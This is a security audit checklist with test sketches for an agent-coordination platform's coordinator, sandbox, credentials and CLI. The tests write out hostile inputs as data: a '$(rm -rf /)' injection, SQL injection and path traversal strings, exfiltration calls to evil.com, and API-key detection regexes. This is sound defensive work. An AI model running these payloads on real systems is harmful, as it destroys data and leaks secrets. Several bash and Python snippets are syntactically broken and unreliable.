# Security Audit Checklist - Phase 0 Components

**Status:** Planning document for production readiness
**Date:** 2025-11-12
**Scope:** IF.coordinator, IF.governor, IF.chassis, CLI, cross-cutting security
**Based on:** IF-TECHNICAL-REVIEW.md (9 security findings), S2-CRITICAL-BUGS-AND-FIXES.md (3 critical bugs)

---

## Overview

This checklist ensures all Phase 0 components meet security requirements before production deployment. Each item includes automated tests and manual verification steps with clear acceptance criteria.

**Critical Security Findings Addressed:**
1. Unsigned dynamic plugins → Signed capability registry
2. Secret handling → Vault integration + redaction
3. Replay attacks → Message seq/nonce/ttl
4. Race conditions → Atomic CAS operations
5. Uncontrolled escalation → Capability matching + budgets
6. No sandboxing → WASM isolation + resource limits
7. Credential leakage → Scoped, temporary credentials

---

## 1. IF.coordinator Security Checklist

### 1.1 etcd/NATS Backend Security

**Requirement:** Secure communication and authentication for coordination backend

#### Automated Tests
```bash
# Test 1: Verify TLS is enforced
if coordinator health --insecure && echo "FAIL: Insecure connection allowed" || echo "PASS"

# Test 2: Verify authentication is required
curl -k http://localhost:2379/v2/keys/test && echo "FAIL: No auth required" || echo "PASS"

# Test 3: Verify certificate validation
if coordinator connect --etcd-host localhost:2379 --skip-verify && echo "FAIL" || echo "PASS"

# Test 4: Check for default/weak credentials
if coordinator auth test --user default --pass default && echo "FAIL: Default creds work" || echo "PASS"
```

#### Manual Verification
- [ ] etcd/NATS uses TLS 1.3+ with strong cipher suites
- [ ] Client authentication required (mTLS or token-based)
- [ ] Certificates use 2048-bit RSA or 256-bit ECC minimum
- [ ] Certificate expiration < 90 days
- [ ] Certificate rotation process documented
- [ ] Credentials stored in Vault, not config files

#### Acceptance Criteria
- ✅ All connections use TLS 1.3+
- ✅ No plaintext credentials in config files
- ✅ Authentication required for all operations
- ✅ Certificate validation cannot be disabled
- ✅ Vault integration tested end-to-end

---

### 1.2 Atomic CAS Operation Security

**Requirement:** Task claiming must be atomic to prevent race conditions

#### Automated Tests
```python
# tests/security/test_coordinator_atomicity.py

import asyncio
import pytest
from infrafabric.coordinator import IFCoordinator

@pytest.mark.asyncio
async def test_atomic_task_claim_race_condition():
    """Test that two swarms cannot claim the same task"""

    coordinator = IFCoordinator()
    task_id = "test-task-001"

    # Create unclaimed task
    await coordinator.create_task(task_id, {"type": "test"})

    # Simulate race: Two swarms claim simultaneously
    results = await asyncio.gather(
        coordinator.claim_task("swarm-A", task_id),
        coordinator.claim_task("swarm-B", task_id)
    )

    # PASS: Exactly one claim succeeds
    assert sum(results) == 1, "Both swarms claimed task (RACE CONDITION)"

    # PASS: Winner is recorded in IF.witness
    witness_log = coordinator.witness.get_operations(task_id=task_id)
    assert len(witness_log) == 1
    assert witness_log[0]['operation'] == 'task_claimed'

@pytest.mark.asyncio
async def test_cas_idempotency():
    """Test that repeated claims by same swarm are idempotent"""

    coordinator = IFCoordinator()
    task_id = "test-task-002"

    await coordinator.create_task(task_id, {"type": "test"})

    # First claim should succeed
    success1 = await coordinator.claim_task("swarm-A", task_id)
    assert success1 is True

    # Second claim by same swarm should be idempotent (no error)
    success2 = await coordinator.claim_task("swarm-A", task_id)
    assert success2 is True  # Already owned, no-op

    # Third claim by different swarm should fail
    success3 = await coordinator.claim_task("swarm-B", task_id)
    assert success3 is False

@pytest.mark.asyncio
async def test_etcd_transaction_rollback():
    """Test that partial transaction failures roll back completely"""

    coordinator = IFCoordinator()

    # Simulate transaction that fails midway
    try:
        async with coordinator.etcd.transaction() as txn:
            txn.put('/tasks/T1/owner', 'swarm-A')
            txn.put('/tasks/T2/owner', 'swarm-A')
            raise Exception("Simulated failure")
    except:
        pass

    # PASS: No partial state committed
    assert coordinator.etcd.get('/tasks/T1/owner') is None
    assert coordinator.etcd.get('/tasks/T2/owner') is None
```

#### Manual Verification
- [ ] Review etcd transaction code for atomicity
- [ ] Verify CAS operations use compare-and-swap primitives
- [ ] Check IF.witness logs all task claims with timestamps
- [ ] Test coordinator recovery after crash (no orphaned locks)
- [ ] Verify no task can be claimed twice in concurrent scenarios

#### Acceptance Criteria
- ✅ Zero race conditions in 10,000 concurrent claim attempts
- ✅ All CAS operations use etcd's atomic primitives
- ✅ IF.witness logs every claim attempt (success + failure)
- ✅ Orphaned tasks auto-recovered after coordinator restart
- ✅ Idempotent operations (safe to retry)

---

### 1.3 Coordinator Access Control

**Requirement:** Only authorized swarms can interact with coordinator

#### Automated Tests
```bash
# Test 1: Unauthorized swarm cannot claim tasks
if coordinator claim-task --swarm-id "rogue-swarm" --task-id "T001" 2>&1 | grep -q "Unauthorized"; then
    echo "PASS: Unauthorized swarm rejected"
else
    echo "FAIL: Unauthorized swarm accepted"
    exit 1
fi

# Test 2: Swarm cannot impersonate another swarm
if coordinator claim-task --swarm-id "swarm-A" --fake-token "swarm-B-token" 2>&1 | grep -q "Invalid token"; then
    echo "PASS: Impersonation prevented"
else
    echo "FAIL: Impersonation allowed"
    exit 1
fi

# Test 3: Expired tokens are rejected
if coordinator claim-task --swarm-id "swarm-A" --token "EXPIRED_TOKEN" 2>&1 | grep -q "Token expired"; then
    echo "PASS: Expired token rejected"
else
    echo "FAIL: Expired token accepted"
    exit 1
fi
```

#### Manual Verification
- [ ] Swarm registry implemented with allow-list
- [ ] JWT or similar token-based authentication
- [ ] Token expiration enforced (max 1 hour)
- [ ] Token refresh mechanism implemented
- [ ] Rate limiting per swarm ID (prevent DoS)

#### Acceptance Criteria
- ✅ Unregistered swarms cannot access coordinator
- ✅ Token impersonation prevented (signature verification)
- ✅ Expired tokens rejected automatically
- ✅ Rate limiting: 100 req/sec per swarm maximum
- ✅ All authentication failures logged to IF.witness

---

## 2. IF.governor Security Checklist

### 2.1 Capability Registry Validation

**Requirement:** Signed capability manifests prevent malicious code injection

#### Automated Tests
```python
# tests/security/test_governor_capability_validation.py

import pytest
from infrafabric.governor import IFGovernor
from cryptography.hazmat.primitives.asymmetric import ed25519

def test_unsigned_capability_rejected():
    """Test that unsigned capability manifests are rejected"""

    governor = IFGovernor()

    manifest = {
        "id": "if://capability/malicious.adapter",
        "version": "1.0.0",
        "entrypoint": "providers/malicious/adapter.py:MaliciousAdapter",
        # Missing signature!
    }

    with pytest.raises(ValueError, match="Missing signature"):
        governor.load_capability(manifest)

def test_invalid_signature_rejected():
    """Test that manifests with invalid signatures are rejected"""

    governor = IFGovernor()

    manifest = {
        "id": "if://capability/vmix.switcher",
        "version": "1.0.0",
        "entrypoint": "providers/vmix/adapter.py:VmixAdapter",
        "signature": {
            "algorithm": "ed25519",
            "pubkey": "FAKE_KEY",
            "sig": "FAKE_SIGNATURE"
        }
    }

    with pytest.raises(ValueError, match="Invalid signature"):
        governor.load_capability(manifest)

def test_capability_not_in_allowlist():
    """Test that non-allowlisted capabilities are rejected"""

    governor = IFGovernor()

    # Valid signature, but not in allow-list
    private_key = ed25519.Ed25519PrivateKey.generate()
    public_key = private_key.public_key()

    manifest = {
        "id": "if://capability/unknown.adapter",
        "version": "1.0.0",
        "entrypoint": "providers/unknown/adapter.py:UnknownAdapter"
    }

    # Sign manifest
    manifest_bytes = json.dumps(manifest, sort_keys=True).encode()
    signature = private_key.sign(manifest_bytes)

    manifest["signature"] = {
        "algorithm": "ed25519",
        "pubkey": public_key.public_bytes_raw().hex(),
        "sig": signature.hex()
    }

    with pytest.raises(ValueError, match="Not in allow-list"):
        governor.load_capability(manifest)

def test_capability_version_pinning():
    """Test that only specific versions are allowed"""

    governor = IFGovernor()

    # Allow-list specifies version 1.0.0, but we try 1.0.1
    manifest = create_signed_manifest(
        id="if://capability/vmix.switcher",
        version="1.0.1"  # Not allowed
    )

    with pytest.raises(ValueError, match="Version not allowed"):
        governor.load_capability(manifest)
```

#### Manual Verification
- [ ] Capability allow-list exists at `~/.if/governor/allowlist.yaml`
- [ ] All production capabilities use ed25519 signatures
- [ ] Public keys stored in version control (not secrets)
- [ ] Private signing keys stored in Vault (not committed)
- [ ] Code review process for adding new capabilities
- [ ] Capability manifests include `scopes`, `limits`, `requires_secrets`

#### Acceptance Criteria
- ✅ 100% of capabilities require valid signatures
- ✅ Unsigned or invalid signatures rejected at load time
- ✅ Allow-list prevents arbitrary capability loading
- ✅ Version pinning enforced (no auto-upgrades)
- ✅ IF.witness logs all capability load attempts

---

### 2.2 Budget Enforcement & Circuit Breakers

**Requirement:** Prevent cost spirals and runaway resource consumption

#### Automated Tests
```python
# tests/security/test_governor_budget_enforcement.py

import pytest
from infrafabric.governor import IFGovernor, ResourcePolicy

@pytest.mark.asyncio
async def test_budget_hard_limit_enforced():
    """Test that swarms cannot exceed budget limits"""

    policy = ResourcePolicy(max_cost_per_task=10.0)
    governor = IFGovernor(policy=policy)

    # Register swarm with $10 budget
    governor.register_swarm(SwarmProfile(
        swarm_id="test-swarm",
        capabilities=[],
        cost_per_hour=15.0,
        reputation_score=1.0,
        current_budget_remaining=10.0
    ))

    # Consume $8
    governor.track_cost("test-swarm", "operation-1", 8.0)

    # Try to consume $5 more (should fail, exceeds budget)
    with pytest.raises(ValueError, match="Budget exceeded"):
        governor.track_cost("test-swarm", "operation-2", 5.0)

    # PASS: Circuit breaker should have tripped
    assert governor.is_circuit_breaker_tripped("test-swarm")

@pytest.mark.asyncio
async def test_circuit_breaker_prevents_further_work():
    """Test that tripped circuit breaker prevents new task assignments"""

    governor = IFGovernor()

    # Trip circuit breaker manually
    governor._trip_circuit_breaker("swarm-A", reason="budget_exhausted")

    # Try to assign work to swarm with tripped breaker
    swarm_id = governor.find_qualified_swarm(
        required_capabilities=[Capability.CODE_ANALYSIS_PYTHON],
        max_cost=5.0
    )

    # PASS: Swarm-A should not be returned
    assert swarm_id != "swarm-A"

@pytest.mark.asyncio
async def test_escalation_on_circuit_breaker():
    """Test that circuit breaker triggers human escalation"""

    governor = IFGovernor()

    # Mock notification system
    notifications = []
    governor._send_notification = lambda msg: notifications.append(msg)

    # Trip circuit breaker
    governor._trip_circuit_breaker("swarm-A", reason="budget_exhausted")

    # Wait for async escalation
    await asyncio.sleep(0.1)

    # PASS: Human notification sent
    assert len(notifications) == 1
    assert "swarm-A" in notifications[0]
    assert "budget_exhausted" in notifications[0]

@pytest.mark.asyncio
async def test_max_swarms_per_task_limit():
    """Test that too many swarms cannot be assigned to one task"""

    policy = ResourcePolicy(max_swarms_per_task=3)
    governor = IFGovernor(policy=policy)

    # Try to assign 5 swarms to one blocker
    assigned = await governor.request_help_for_blocker(
        blocked_swarm_id="swarm-A",
        blocker_description={"capabilities": ["code-analysis:rust"]}
    )

    # PASS: Only 3 swarms assigned (not 5)
    assert len(assigned) <= 3
```

#### Manual Verification
- [ ] Budget tracking integrated with IF.optimise
- [ ] Circuit breaker thresholds documented in policy
- [ ] Human escalation workflow tested end-to-end
- [ ] Budget reset procedure requires approval
- [ ] Historical cost data tracked in IF.witness

#### Acceptance Criteria
- ✅ Hard budget limits enforced (no overruns)
- ✅ Circuit breaker trips within 1 second of budget exceeded
- ✅ Human escalation automatic (Slack/email notification)
- ✅ Max swarms per task enforced (prevent "too many cooks")
- ✅ Budget reset requires human approval via CLI

---

### 2.3 Capability Matching Security

**Requirement:** Prevent expertise mismatch and information leakage

#### Automated Tests
```bash
# Test 1: Swarm without required capability cannot be assigned
python3 << 'EOF'
from infrafabric.governor import IFGovernor, Capability, SwarmProfile

governor = IFGovernor()
governor.register_swarm(SwarmProfile(
    swarm_id="legal-swarm",
    capabilities=[Capability.CONTRACT_REVIEW_NDA],
    cost_per_hour=20.0,
    reputation_score=1.0,
    current_budget_remaining=100.0
))

# Try to assign Rust coding task to legal swarm
swarm_id = governor.find_qualified_swarm(
    required_capabilities=[Capability.CODE_ANALYSIS_RUST],
    max_cost=50.0
)

# PASS: Should not assign legal swarm to Rust task
assert swarm_id != "legal-swarm", "FAIL: Capability mismatch allowed"
print("PASS: Capability matching enforced")
EOF

# Test 2: Verify minimum capability match threshold
python3 << 'EOF'
from infrafabric.governor import IFGovernor, ResourcePolicy

policy = ResourcePolicy(min_capability_match=0.7)  # 70% required
governor = IFGovernor(policy=policy)

# Swarm with 50% capability match should be rejected
# Test capability overlap calculation
# ...

print("PASS: Min capability match threshold enforced")
EOF
```

#### Manual Verification
- [ ] Capability taxonomy documented (all valid capabilities listed)
- [ ] Capability inference reviewed for accuracy
- [ ] Cross-domain assignments explicitly blocked
- [ ] Sensitive capabilities flagged (e.g., secrets access)
- [ ] Capability grants require human approval

#### Acceptance Criteria
- ✅ 70%+ capability match required for assignment
- ✅ Cross-domain assignments prevented (code ≠ legal)
- ✅ Sensitive capabilities require explicit grants
- ✅ IF.witness logs all assignment decisions with capability match scores
- ✅ Human override available but logged

---

## 3. IF.chassis Security Checklist

### 3.1 WASM Sandboxing

**Requirement:** Isolate swarm execution to prevent system compromise

#### Automated Tests
```python
# tests/security/test_chassis_sandboxing.py

import pytest
from infrafabric.chassis import IFChassis, ResourceLimits

def test_filesystem_access_blocked():
    """Test that WASM sandbox cannot access host filesystem"""

    chassis = IFChassis()

    # Load malicious WASM that tries to read /etc/passwd
    malicious_wasm = compile_wasm("""
        (module
            (import "env" "read_file" (func $read_file (param i32) (result i32)))
            (func (export "attack")
                i32.const 0  ;; /etc/passwd pointer
                call $read_file
            )
        )
    """)

    # PASS: Filesystem function not available in linker
    with pytest.raises(ValueError, match="Unknown import: env.read_file"):
        chassis.load_swarm("malicious", malicious_wasm, contract)

def test_network_access_blocked():
    """Test that WASM sandbox cannot make arbitrary network requests"""

    chassis = IFChassis()

    # Load WASM that tries to connect to arbitrary host
    malicious_wasm = compile_wasm("""
        (module
            (import "env" "tcp_connect" (func $connect (param i32 i32) (result i32)))
            (func (export "attack")
                i32.const 192168001001  ;; IP address
                i32.const 1234          ;; Port
                call $connect
            )
        )
    """)

    # PASS: Network function not available
    with pytest.raises(ValueError, match="Unknown import: env.tcp_connect"):
        chassis.load_swarm("malicious", malicious_wasm, contract)

def test_http_requests_limited_to_allowlist():
    """Test that only allowed API endpoints can be called"""

    chassis = IFChassis()

    credentials = ScopedCredentials(
        swarm_id="test-swarm",
        task_id="T001",
        api_token="temp-token",
        ttl_seconds=300,
        allowed_endpoints=["https://api.openai.com/v1/chat/completions"]
    )

    # Allowed endpoint should work
    result = chassis._scoped_http("https://api.openai.com/v1/chat/completions", credentials)
    assert result is not None

    # Disallowed endpoint should be blocked
    with pytest.raises(PermissionError, match="Endpoint not in allow-list"):
        chassis._scoped_http("https://evil.com/exfiltrate", credentials)

def test_memory_limit_enforced():
    """Test that swarm cannot exceed memory limit"""

    chassis = IFChassis()

    limits = ResourceLimits(max_memory_mb=256)
    contract = ServiceContract(
        swarm_id="memory-hog",
        capabilities=[],
        resource_requirements=limits,
        slos=ServiceLevelObjective(p99_latency_ms=1000, success_rate=0.95, availability=0.99),
        version="1.0.0"
    )

    # Load swarm that tries to allocate 512 MB
    memory_hog_wasm = compile_wasm("""
        (module
            (memory (export "memory") 8192)  ;; 512 MB (8192 pages * 64KB)
            (func (export "allocate"))
        )
    """)

    # PASS: Memory allocation should fail
    with pytest.raises(RuntimeError, match="Memory limit exceeded"):
        chassis.load_swarm("memory-hog", memory_hog_wasm, contract)

def test_cpu_time_limit_enforced():
    """Test that swarm execution is terminated after timeout"""

    chassis = IFChassis()

    limits = ResourceLimits(max_execution_time_seconds=5)
    contract = ServiceContract(
        swarm_id="infinite-loop",
        capabilities=[],
        resource_requirements=limits,
        slos=ServiceLevelObjective(p99_latency_ms=1000, success_rate=0.95, availability=0.99),
        version="1.0.0"
    )

    # Load swarm with infinite loop
    infinite_loop_wasm = compile_wasm("""
        (module
            (func (export "execute_task")
                (loop $forever
                    br $forever
                )
            )
        )
    """)

    chassis.load_swarm("infinite-loop", infinite_loop_wasm, contract)

    # Execute task
    with pytest.raises(asyncio.TimeoutError):
        await chassis.execute_task("infinite-loop", {}, credentials)
```

#### Manual Verification
- [ ] WASM runtime (wasmtime) version >= 19.0 (security patches)
- [ ] Host function allow-list documented (only safe functions exposed)
- [ ] No raw filesystem access available
- [ ] No raw network access available
- [ ] HTTP requests limited to allow-list per task
- [ ] Sandbox escape testing performed (external security audit)

#### Acceptance Criteria
- ✅ Zero host filesystem access from WASM
- ✅ Zero arbitrary network access from WASM
- ✅ HTTP allow-list enforced per request
- ✅ Memory limits enforced at runtime
- ✅ CPU time limits enforced at runtime
- ✅ External security audit passed (no sandbox escapes)

---

### 3.2 Resource Isolation & Rate Limiting

**Requirement:** Prevent noisy neighbor attacks and resource exhaustion

#### Automated Tests
```python
# tests/security/test_chassis_resource_isolation.py

import pytest
import asyncio
from infrafabric.chassis import IFChassis

@pytest.mark.asyncio
async def test_per_swarm_rate_limiting():
    """Test that each swarm has independent rate limit"""

    chassis = IFChassis()

    # Configure swarms with 10 req/sec limit each
    swarm_a_limits = ResourceLimits(max_api_calls_per_second=10)
    swarm_b_limits = ResourceLimits(max_api_calls_per_second=10)

    # Swarm A exhausts its rate limit
    for i in range(10):
        await chassis._apply_rate_limit("swarm-A")

    # Swarm A should be rate-limited
    with pytest.raises(RateLimitExceeded):
        await chassis._apply_rate_limit("swarm-A")

    # Swarm B should still have full quota (not affected by A)
    for i in range(10):
        await chassis._apply_rate_limit("swarm-B")  # Should succeed

    print("PASS: Per-swarm rate limiting works")

@pytest.mark.asyncio
async def test_noisy_neighbor_prevention():
    """Test that buggy swarm cannot starve others"""

    chassis = IFChassis()

    # Start 10 swarms
    swarms = [f"swarm-{i}" for i in range(10)]

    # Swarm-7 enters infinite loop (simulated by high request rate)
    async def noisy_swarm():
        while True:
            try:
                await chassis._apply_rate_limit("swarm-7")
                await asyncio.sleep(0.01)  # Try 100 req/sec
            except RateLimitExceeded:
                await asyncio.sleep(0.1)  # Back off

    # Start noisy swarm in background
    noisy_task = asyncio.create_task(noisy_swarm())

    # Other swarms should still be able to make requests
    for i in range(9):
        swarm_id = f"swarm-{i}"
        if swarm_id == "swarm-7":
            continue

        # Should succeed (not blocked by noisy neighbor)
        await chassis._apply_rate_limit(swarm_id)

    noisy_task.cancel()
    print("PASS: Noisy neighbor prevented")

@pytest.mark.asyncio
async def test_memory_isolation():
    """Test that swarms cannot access each other's memory"""

    chassis = IFChassis()

    # Swarm A stores secret in memory
    swarm_a_instance = chassis.swarm_runtimes["swarm-A"]
    swarm_a_instance.memory[0] = 0x42  # Secret value

    # Swarm B tries to read Swarm A's memory
    swarm_b_instance = chassis.swarm_runtimes["swarm-B"]

    # PASS: Separate memory spaces
    assert swarm_b_instance.memory[0] != 0x42

    # Swarm B cannot access Swarm A's instance
    with pytest.raises(PermissionError):
        chassis._read_other_swarm_memory("swarm-B", "swarm-A", offset=0)
```

#### Manual Verification
- [ ] Token bucket algorithm implemented for rate limiting
- [ ] Separate memory spaces for each swarm verified
- [ ] CPU quotas enforced via cgroups (if not using WASM)
- [ ] Disk I/O limits enforced (if applicable)
- [ ] Network bandwidth limits enforced
- [ ] Load testing: 100 swarms, 1 noisy → 99 unaffected

#### Acceptance Criteria
- ✅ Per-swarm rate limiting (10 API calls/sec default)
- ✅ Noisy neighbor attack prevented (99 swarms unaffected)
- ✅ Memory isolation between swarms verified
- ✅ CPU quotas enforced (25% of 1 core default)
- ✅ Resource exhaustion testing passed

---

### 3.3 Credential Scoping & Rotation

**Requirement:** Temporary, task-scoped credentials prevent long-term compromise

#### Automated Tests
```python
# tests/security/test_chassis_credentials.py

import pytest
import time
from infrafabric.chassis import ScopedCredentials

def test_credentials_expire_after_ttl():
    """Test that credentials cannot be used after TTL"""

    credentials = ScopedCredentials(
        swarm_id="test-swarm",
        task_id="T001",
        api_token="temp-token-12345",
        ttl_seconds=2,  # 2 second TTL
        allowed_endpoints=["https://api.openai.com/v1/chat/completions"]
    )
    credentials.created_at = time.time()

    # Should work initially
    assert not credentials.is_expired

    # Wait for expiration
    time.sleep(3)

    # Should be expired
    assert credentials.is_expired

    # Attempt to use expired credentials should fail
    chassis = IFChassis()
    with pytest.raises(PermissionError, match="Credentials expired"):
        chassis._validate_credentials(credentials)

def test_credentials_limited_to_specific_endpoints():
    """Test that credentials only work for allowed endpoints"""

    credentials = ScopedCredentials(
        swarm_id="test-swarm",
        task_id="T001",
        api_token="temp-token-12345",
        ttl_seconds=300,
        allowed_endpoints=[
            "https://api.openai.com/v1/chat/completions",
            "https://api.anthropic.com/v1/messages"
        ]
    )
    credentials.created_at = time.time()

    chassis = IFChassis()

    # Allowed endpoints should work
    chassis._validate_endpoint("https://api.openai.com/v1/chat/completions", credentials)
    chassis._validate_endpoint("https://api.anthropic.com/v1/messages", credentials)

    # Disallowed endpoint should fail
    with pytest.raises(PermissionError, match="Endpoint not allowed"):
        chassis._validate_endpoint("https://evil.com/steal", credentials)

def test_credentials_cannot_be_reused_across_tasks():
    """Test that credentials are task-specific"""

    credentials_task1 = ScopedCredentials(
        swarm_id="test-swarm",
        task_id="T001",
        api_token="temp-token-12345",
        ttl_seconds=300,
        allowed_endpoints=["https://api.openai.com/v1/chat/completions"]
    )
    credentials_task1.created_at = time.time()

    chassis = IFChassis()

    # Credentials should work for Task T001
    chassis._validate_credentials_for_task(credentials_task1, "T001")

    # Same credentials should NOT work for Task T002
    with pytest.raises(PermissionError, match="Credentials not valid for this task"):
        chassis._validate_credentials_for_task(credentials_task1, "T002")

def test_no_long_lived_api_keys_in_config():
    """Test that no long-lived API keys are stored in config files"""

    import os
    import glob

    # Search for potential API keys in config files
    config_files = glob.glob("~/.if/**/*.yaml", recursive=True) + \
                   glob.glob("~/.if/**/*.json", recursive=True) + \
                   glob.glob("~/.if/**/*.conf", recursive=True)

    forbidden_patterns = [
        r"sk-[a-zA-Z0-9]{32,}",  # OpenAI key pattern
        r"sk-ant-[a-zA-Z0-9-]{40,}",  # Anthropic key pattern
        r"api_key\s*=\s*['\"][^'\"]{20,}['\"]",  # Generic API key
    ]

    for config_file in config_files:
        with open(config_file, 'r') as f:
            content = f.read()
            for pattern in forbidden_patterns:
                if re.search(pattern, content):
                    raise AssertionError(f"Long-lived API key found in {config_file}")

    print("PASS: No long-lived API keys in config files")
```

#### Manual Verification
- [ ] Vault integration for credential generation
- [ ] Credentials automatically rotated every 5 minutes
- [ ] Expired credentials automatically revoked
- [ ] Audit log of all credential generations in IF.witness
- [ ] No API keys in environment variables
- [ ] No API keys in code or config files
- [ ] Credential generation requires IF.governor approval

#### Acceptance Criteria
- ✅ All credentials are temporary (max 5 minute TTL)
- ✅ Credentials scoped to specific task and endpoints
- ✅ Expired credentials automatically rejected
- ✅ Zero long-lived API keys in config/code
- ✅ Vault integration tested end-to-end
- ✅ Credential rotation automated

---

## 4. CLI Security Checklist

### 4.1 Input Validation

**Requirement:** Prevent injection attacks and malformed input

#### Automated Tests
```bash
# Test 1: SQL injection prevention
if if witness query --trace-token "'; DROP TABLE witness; --" 2>&1 | grep -q "Invalid token format"; then
    echo "PASS: SQL injection prevented"
else
    echo "FAIL: SQL injection possible"
    exit 1
fi

# Test 2: Command injection prevention
if if capability apply --scene "\$(rm -rf /)" 2>&1 | grep -q "Invalid characters"; then
    echo "PASS: Command injection prevented"
else
    echo "FAIL: Command injection possible"
    exit 1
fi

# Test 3: Path traversal prevention
if if witness export --output "../../../etc/passwd" 2>&1 | grep -q "Invalid path"; then
    echo "PASS: Path traversal prevented"
else
    echo "FAIL: Path traversal possible"
    exit 1
fi

# Test 4: XSS prevention in output
output=$(if capability list --format html)
if echo "$output" | grep -q "<script>"; then
    echo "FAIL: XSS possible in output"
    exit 1
else
    echo "PASS: XSS prevented"
fi

# Test 5: Argument length limits
if if message send --json @/dev/zero 2>&1 | grep -q "Input too large"; then
    echo "PASS: Input length limit enforced"
else
    echo "FAIL: No input length limit"
    exit 1
fi
```

#### Manual Verification
- [ ] All user input validated against whitelist regex
- [ ] File path inputs validated (no path traversal)
- [ ] JSON inputs validated against schema (jsonschema)
- [ ] Maximum input sizes enforced (e.g., 1 MB)
- [ ] Unicode validation (prevent homoglyph attacks)
- [ ] Output encoding for HTML/JSON/CSV

#### Acceptance Criteria
- ✅ Zero injection vulnerabilities (SQL, command, path)
- ✅ All inputs validated against strict schema
- ✅ Input size limits enforced (1 MB max)
- ✅ Output properly encoded (no XSS)
- ✅ Fuzzing testing passed (1M random inputs)

---

### 4.2 Credential Storage

**Requirement:** CLI credentials stored securely, not in plaintext

#### Automated Tests
```bash
# Test 1: Credentials not stored in plaintext
if grep -r "sk-ant-" ~/.if/ 2>/dev/null | grep -v ".vault"; then
    echo "FAIL: Plaintext credentials found"
    exit 1
else
    echo "PASS: No plaintext credentials"
fi

# Test 2: Credentials stored in OS keychain/Vault
if if config get-credential --key openai 2>&1 | grep -q "Retrieved from vault"; then
    echo "PASS: Credentials in vault"
else
    echo "FAIL: Credentials not in vault"
    exit 1
fi

# Test 3: Config files have restrictive permissions
config_perms=$(stat -c "%a" ~/.if/config.yaml)
if [ "$config_perms" -eq 600 ]; then
    echo "PASS: Config file has 0600 permissions"
else
    echo "FAIL: Config file has weak permissions: $config_perms"
    exit 1
fi

# Test 4: Credential rotation reminder
last_rotation=$(if config get-credential --key openai --show-age)
if [ "$last_rotation" -gt 90 ]; then
    echo "WARN: Credentials older than 90 days"
else
    echo "PASS: Credentials recently rotated"
fi
```

#### Manual Verification
- [ ] Vault backend configured (HashiCorp Vault or AWS Secrets Manager)
- [ ] OS keychain integration (macOS Keychain, Windows Credential Manager)
- [ ] Credentials never logged to stdout/files
- [ ] Credential rotation workflow documented
- [ ] Audit log of credential access in IF.witness
- [ ] Emergency credential revocation procedure tested

#### Acceptance Criteria
- ✅ Zero plaintext credentials in files
- ✅ Vault integration for all secrets
- ✅ Config files have 0600 permissions
- ✅ Credential rotation reminder at 90 days
- ✅ Credentials never appear in logs/output

---

### 4.3 Authentication & Authorization

**Requirement:** CLI operations require proper authentication

#### Automated Tests
```bash
# Test 1: Unauthenticated CLI usage blocked
unset IF_AUTH_TOKEN
if if capability list 2>&1 | grep -q "Authentication required"; then
    echo "PASS: Authentication required"
else
    echo "FAIL: Unauthenticated access allowed"
    exit 1
fi

# Test 2: Invalid token rejected
export IF_AUTH_TOKEN="invalid-token"
if if capability list 2>&1 | grep -q "Invalid token"; then
    echo "PASS: Invalid token rejected"
else
    echo "FAIL: Invalid token accepted"
    exit 1
fi

# Test 3: Token expiration enforced
export IF_AUTH_TOKEN="$(if auth login --username test --password test --ttl 1)"
sleep 2
if if capability list 2>&1 | grep -q "Token expired"; then
    echo "PASS: Token expiration enforced"
else
    echo "FAIL: Expired token accepted"
    exit 1
fi

# Test 4: Role-based access control
export IF_AUTH_TOKEN="$(if auth login --username readonly --password test)"
if if capability apply --id test 2>&1 | grep -q "Permission denied"; then
    echo "PASS: RBAC enforced"
else
    echo "FAIL: RBAC not enforced"
    exit 1
fi
```

#### Manual Verification
- [ ] Token-based authentication implemented
- [ ] JWT or similar secure token format
- [ ] Token expiration enforced (max 1 day)
- [ ] Role-based access control (admin, operator, readonly)
- [ ] Sensitive operations require sudo/2FA
- [ ] Login attempts logged to IF.witness

#### Acceptance Criteria
- ✅ Unauthenticated CLI usage blocked
- ✅ Token expiration enforced (max 24 hours)
- ✅ RBAC implemented (at least 3 roles)
- ✅ Sensitive operations require elevated privileges
- ✅ All authentication attempts logged

---

## 5. Cross-Cutting Security Concerns

### 5.1 Cryptographic Standards

**Requirement:** Use modern, secure cryptography throughout

#### Automated Tests
```python
# tests/security/test_cryptography.py

import pytest
from cryptography.hazmat.primitives.asymmetric import rsa, ed25519
from cryptography.hazmat.primitives import hashes
from infrafabric.crypto import verify_signature, generate_keypair

def test_signature_algorithm_is_ed25519():
    """Test that ed25519 is used for signatures (not RSA)"""

    public_key, private_key = generate_keypair()

    assert isinstance(private_key, ed25519.Ed25519PrivateKey)
    assert isinstance(public_key, ed25519.Ed25519PublicKey)

def test_weak_signature_rejected():
    """Test that weak signature algorithms are rejected"""

    # Try to use RSA-1024 (weak)
    with pytest.raises(ValueError, match="Key size too small"):
        weak_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=1024
        )
        verify_signature(weak_key, b"data", b"signature")

def test_hash_algorithm_is_sha256_or_better():
    """Test that only SHA-256+ is used for hashing"""

    from infrafabric.crypto import hash_data

    result = hash_data(b"test data")

    # Should be 32 bytes (SHA-256) or 64 bytes (SHA-512)
    assert len(result) in [32, 64]

def test_random_number_generation_is_cryptographically_secure():
    """Test that cryptographically secure RNG is used"""

    from infrafabric.crypto import generate_nonce

    nonce1 = generate_nonce()
    nonce2 = generate_nonce()

    # Nonces should be unique
    assert nonce1 != nonce2

    # Nonces should be 16+ bytes
    assert len(nonce1) >= 16
```

#### Manual Verification
- [ ] ed25519 used for signatures (not RSA)
- [ ] SHA-256 or better for hashing (not MD5/SHA-1)
- [ ] TLS 1.3 for all network connections
- [ ] Cryptographically secure RNG (os.urandom or secrets module)
- [ ] No hardcoded keys or IVs
- [ ] Key rotation schedule documented

#### Acceptance Criteria
- ✅ ed25519 signatures only
- ✅ SHA-256+ hashing only
- ✅ TLS 1.3 enforced for all connections
- ✅ Cryptographically secure RNG verified
- ✅ No weak algorithms accepted
- ✅ Annual security audit of crypto implementation

---

### 5.2 Replay Protection

**Requirement:** IF.connect messages protected against replay attacks

#### Automated Tests
```python
# tests/security/test_replay_protection.py

import pytest
import time
from infrafabric.connect import IFConnectEnvelope

def test_message_requires_sequence_number():
    """Test that messages without seq are rejected"""

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        # Missing seq!
    }

    with pytest.raises(ValueError, match="Missing sequence number"):
        IFConnectEnvelope.validate(message)

def test_message_requires_nonce():
    """Test that messages without nonce are rejected"""

    message = {
        "id": "msg-001",
        "performative": "inform",
        "sender": "if://agent/test",
        "seq": 1,
        # Missing nonce!
    }

